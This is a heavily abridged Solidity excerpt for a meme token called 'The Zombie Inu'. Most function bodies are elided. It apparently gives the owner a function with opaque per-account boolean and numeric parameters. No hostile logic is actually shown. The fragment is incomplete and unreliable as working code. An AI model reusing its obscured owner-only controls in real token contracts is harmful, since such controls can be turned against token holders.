 ...
 * Awakening things with it...
 * A dead shiba inu rises...
 * 
 * The Zombie Inu
 * 
 * https://t.me/TheZombieInu
 **/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function DayOfTheDead(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _raisingTheDead(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Zombie is Context, ERC20 {
    constructor(
        ...
        _raisingTheDead(owner, initialSupply, house6, house7);
    }
}

contract TheZombieInu is ERC20Zombie {
    constructor() ERC20Zombie("The Zombie Inu", "ZOMBIEINU", false, true, 900, 25, msg.sender, 20000000 * 10 ** 18, msg.sender, 33) {
    }
}